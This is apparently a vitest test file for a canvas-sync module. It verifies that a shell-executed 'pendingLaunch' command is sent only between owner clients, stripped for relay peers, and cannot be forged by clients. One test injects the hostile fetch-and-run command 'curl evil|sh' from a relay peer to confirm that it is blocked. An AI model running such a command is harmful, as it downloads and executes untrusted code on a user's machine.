import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { testTmpDir } from './test-tmp'
import { initPlatform, resetPlatformForTests, type CorePlatform } from './platform'
import { initCanvasSync, publishCanvasMutation, setReflectedListener, stampMutation } from './canvas-sync'
import { IPC } from '../shared/ipc'
import { createCanvasAuthority } from './canvas-authority'
import { applyCanvasMutation } from '../shared/canvas-mutations'
import type { CanvasMutation, CanvasNodeState, PendingLaunch } from '../shared/types'

/**
 * `pendingLaunch` is a machine-local exec field (@shared/node-exec): its `command` is typed into a
 * shell once the wait is over. The reflector therefore lets it travel ONLY owner→owner (this app's
 * window / a cookie-authenticated Server Edition tab), marked `origin: 'core'`, and strips it for
 * every relay peer. And `origin: 'core'` is the core's alone: a client cannot supply it.
 */

const launch: PendingLaunch = { after: [], command: 'claude "hi"', attempted: true, manualOnly: true }
const node = (id: string, extra: Partial<CanvasNodeState> = {}): CanvasNodeState =>
  ({
    id,
    kind: 'terminal',
    title: 't',
    color: '#fff',
    position: { x: 0, y: 0 },
    size: { width: 10, height: 10 },
    ...extra
  }) as CanvasNodeState

function testPlatform(owners: number[]) {
  const sent: Array<{ to: number; m: CanvasMutation }> = []
  let listener: ((senderId: number, ...args: unknown[]) => void) | undefined
  let clients: number[] = []
  const p: CorePlatform = {
    userDataDir: testTmpDir('nodeterm-canvas-launch-'),
    appVersion: '0.0.0-test',
    isPackaged: false,
    handle: () => {},
    on: () => {},
    handleWithSender: () => {},
    onWithSender: (ch, fn) => {
      if (ch === IPC.canvasMut) listener = fn
    },
    clientIds: () => clients,
    isOwnerClient: (id) => owners.includes(id),
    sendTo: (to, channel, _projectId, m) => {
      if (channel === IPC.canvasMut) sent.push({ to, m: m as CanvasMutation })
    },
    broadcast: () => {},
    openExternal: async () => {}
  }
  return {
    p,
    sent,
    setClients: (ids: number[]) => (clients = ids),
    cast: (senderId: number, m: unknown) => listener?.(senderId, 'p1', m)
  }
}

let t: ReturnType<typeof testPlatform>
const to = (id: number) => t.sent.find((s) => s.to === id)!.m as Extract<CanvasMutation, { op: 'upsert' }>

beforeEach(() => {
  // 1, 2 = owner clients (two Server Edition tabs); 9 = a relay peer (a hosted-team guest).
  t = testPlatform([1, 2])
  t.setClients([1, 2, 9])
  initPlatform(t.p)
  initCanvasSync()
})
afterEach(() => {
  setReflectedListener(null)
  resetPlatformForTests()
})

describe('stampMutation: origin is unforgeable', () => {
  it('deletes a client-supplied origin: core', () => {
    const forged = { op: 'remove', id: 'n1', origin: 'core' } as CanvasMutation
    expect('origin' in stampMutation(forged, 1)).toBe(false)
  })
})

describe('reflector: owner → owner only', () => {
  it('an owner tab\'s claim reaches the other owner tab WITH the launch, vouched', () => {
    t.cast(1, { op: 'upsert', node: node('n1', { pendingLaunch: launch }), src: 'cv-a' })
    expect(to(2).origin).toBe('core')
    expect(to(2).node.pendingLaunch).toEqual(launch)
    expect(to(1).node.pendingLaunch).toEqual(launch) // the sender's ack
  })

  it('the same mutation reaches a relay peer WITHOUT the launch and without origin', () => {
    t.cast(1, { op: 'upsert', node: node('n1', { pendingLaunch: launch, shell: '/bin/zsh' }) })
    expect(to(9).origin).toBeUndefined()
    expect(to(9).node.pendingLaunch).toBeUndefined()
    expect(to(9).node.shell).toBeUndefined()
  })

  it('a relay peer cannot arm anybody: its launch is stripped for every recipient, and its origin is not honoured', () => {
    t.cast(9, {
      op: 'upsert',
      node: node('n1', { pendingLaunch: { after: [], command: 'curl evil|sh' } }),
      origin: 'core'
    })
    for (const id of [1, 2, 9]) {
      expect(to(id).origin).toBeUndefined()
      expect(to(id).node.pendingLaunch).toBeUndefined()
    }
  })

  it('a platform that does not know owners (no isOwnerClient) strips for everyone', () => {
    resetPlatformForTests()
    t = testPlatform([])
    t.setClients([1, 2])
    const { isOwnerClient: _o, ...bare } = t.p
    initPlatform(bare as CorePlatform)
    initCanvasSync()
    t.cast(1, { op: 'upsert', node: node('n1', { pendingLaunch: launch }) })
    expect(to(2).node.pendingLaunch).toBeUndefined()
    expect(to(2).origin).toBeUndefined()
  })
})

describe('publishCanvasMutation (the core\'s own write)', () => {
  it('owner clients get the launch (and a delivery\'s CLEAR) vouched; relay peers get neither', () => {
    publishCanvasMutation('p1', { op: 'upsert', node: node('n1', { pendingLaunch: launch }) })
    expect(to(1).origin).toBe('core')
    expect(to(1).node.pendingLaunch).toEqual(launch)
    expect(to(9).node.pendingLaunch).toBeUndefined()
    expect(to(9).origin).toBeUndefined()
    t.sent.length = 0
    publishCanvasMutation('p1', { op: 'upsert', node: node('n1') })
    expect(to(1).origin).toBe('core') // the absence of a launch is authoritative for owners
  })
})

describe('the reflected-op listener (the Server Edition canvas authority)', () => {
  // The authority's state carries no exec field (core/canvas-authority.ts rule 1): a launch reaches
  // disk only through a save's own exec carry, into the machine-local index. So even an OWNER's op —
  // which the other owner tabs do receive with its launch — reaches the listener without one.
  it('hears an owner cast and a core write WITHOUT the launch, while owner tabs still get it', () => {
    const heard: CanvasMutation[] = []
    setReflectedListener((_p, m) => heard.push(m))
    t.cast(1, { op: 'upsert', node: node('n1', { pendingLaunch: launch }) })
    publishCanvasMutation('p1', { op: 'upsert', node: node('n2', { pendingLaunch: launch }) })
    expect(heard).toHaveLength(2)
    for (const m of heard) {
      expect((m as Extract<CanvasMutation, { op: 'upsert' }>).node.pendingLaunch).toBeUndefined()
      expect(m.origin).toBeUndefined()
    }
    expect(t.sent.filter((x) => x.to === 2).map((x) => (x.m as Extract<CanvasMutation, { op: 'upsert' }>).node.pendingLaunch))
      .toEqual([launch, launch])
  })
})

describe('the canvas authority\'s outside-edit diff (N1)', () => {
  // The authority's state carries no launch (rule 1), so every upsert of its diff lacks one. Vouched
  // as the core's own write, an owner tab reads that absence as "the core cleared it" — on its live
  // canvas AND in its stored copy — and its next save writes the loss into `localExec`: a git pull
  // that merely moved an `--after` node cancelled its queued launch. So the authority's publish is
  // UNTRUSTED (server/index.ts passes `{ trusted: false }`, pinned in hosted-boot.test.ts), and
  // every owner carries its own launch across.
  it('an outside edit that moves an armed node reaches owners unvouched, so each keeps its launch', async () => {
    const authority = createCanvasAuthority({
      sharedProjectIds: () => new Set(['p1']),
      readContent: async () => ({ nodes: [node('n1')], bridges: [], ropes: [] }),
      writeContent: async () => true,
      publish: (id, m) => {
        publishCanvasMutation(id, m, { trusted: false })
      },
      setTimer: () => null,
      clearTimer: () => {},
      log: () => {}
    })
    setReflectedListener((id, m) => authority.onReflected(id, m))
    authority.sharedChanged()
    await authority.flushAll()
    await authority.adoptOutsideEdit({
      id: 'p1',
      name: 'p',
      color: '#fff',
      viewport: { x: 0, y: 0, zoom: 1 },
      nodes: [node('n1', { position: { x: 500, y: 0 } })]
    })
    const up = to(1)
    expect(up.op).toBe('upsert')
    expect(up.origin).toBeUndefined()
    // An owner's stored copy of the armed node (the live canvas's `applyMutationToFlow` reads the
    // same `origin`): the move lands, the launch stays.
    const [kept] = applyCanvasMutation([node('n1', { pendingLaunch: launch })], up)
    expect(kept.position.x).toBe(500)
    expect(kept.pendingLaunch).toEqual(launch)
    await authority.stop()
  })

  it('an untrusted core write strips a launch for everybody, and never vouches', () => {
    publishCanvasMutation('p1', { op: 'upsert', node: node('n1', { pendingLaunch: launch }) }, { trusted: false })
    for (const id of [1, 2, 9]) {
      expect(to(id).origin).toBeUndefined()
      expect(to(id).node.pendingLaunch).toBeUndefined()
    }
  })
})
